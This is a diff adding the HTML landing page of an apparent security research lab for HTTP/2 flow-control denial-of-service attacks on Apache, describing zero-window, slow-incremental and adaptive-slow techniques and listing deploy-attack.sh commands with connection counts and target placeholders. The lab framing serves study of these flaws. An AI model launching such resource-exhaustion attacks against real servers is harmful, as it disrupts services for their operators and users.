@@ -1,0 +1,89 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>HTTP/2 Flow Control Attack Lab</title>
+    <meta charset="utf-8">
+    <style>
+        body { 
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; 
+            margin: 40px; 
+            background: #f5f5f5; 
+        }
+        .container { 
+            max-width: 800px; 
+            margin: 0 auto; 
+            background: white; 
+            padding: 40px; 
+            border-radius: 8px; 
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1); 
+        }
+        .header { color: #4285f4; margin-bottom: 20px; }
+        .warning { 
+            color: #ea4335; 
+            background: #fce8e6; 
+            padding: 15px; 
+            border-radius: 4px; 
+            border-left: 4px solid #ea4335; 
+            margin: 20px 0; 
+        }
+        .status { 
+            background: #e8f5e8; 
+            padding: 15px; 
+            border-radius: 4px; 
+            border-left: 4px solid #34a853; 
+        }
+        .code { 
+            background: #f8f9fa; 
+            padding: 10px; 
+            border-radius: 4px; 
+            font-family: monospace; 
+            margin: 10px 0; 
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1 class="header">🚀 HTTP/2 Flow Control Attack Lab</h1>
+        <p>This is a security research environment for studying HTTP/2 protocol flow control vulnerabilities.</p>
+        
+        <div class="warning">
+            <strong>⚠️ Educational Use Only:</strong> This server is configured for security research and educational purposes. Use responsibly and only attack servers you own or have explicit permission to test.
+        </div>
+        
+        <div class="status">
+            <strong>✅ Server Status:</strong> Ready for HTTP/2 flow control attacks<br>
+            <strong>🔧 Protocol Support:</strong> HTTP/1.1, HTTP/2<br>
+            <strong>🎯 Available Attacks:</strong> Zero-Window, Slow-Incremental, Adaptive-Slow
+        </div>
+        
+        <h3>🚀 Attack Types</h3>
+        <ul>
+            <li><strong>Zero-Window Attack:</strong> Basic HTTP/2 flow control exploitation using INITIAL_WINDOW_SIZE=0</li>
+            <li><strong>Slow-Incremental Attack:</strong> Sustained resource exhaustion with minimal WINDOW_UPDATE increments</li>
+            <li><strong>Adaptive-Slow Attack:</strong> Advanced intelligent attack adaptation with dynamic timing</li>
+        </ul>
+
+        <h3>Attack Commands</h3>
+        <div class="code">
+# Zero-Window Attack (Apache 2.4.55)
+./deploy-attack.sh zero-window local --connections 512
+./deploy-attack.sh zero-window YOUR_IP --connections 512
+
+# Slow-Incremental Attack (Apache 2.4.62)  
+./deploy-attack.sh slow-incremental local --connections 256
+./deploy-attack.sh slow-incremental YOUR_IP --connections 256
+
+# Adaptive-Slow Attack (Apache 2.4.62)
+./deploy-attack.sh adaptive-slow local --connections 128
+./deploy-attack.sh adaptive-slow YOUR_IP --connections 128
+        </div>
+        
+        <p><strong>Timestamp:</strong> <span id="timestamp"></span></p>
+        <p><strong>Server:</strong> Apache HTTP/2 Flow Control Test Server</p>
+    </div>
+    
+    <script>
+        document.getElementById('timestamp').textContent = new Date().toLocaleString();
+    </script>
+</body>
+</html>
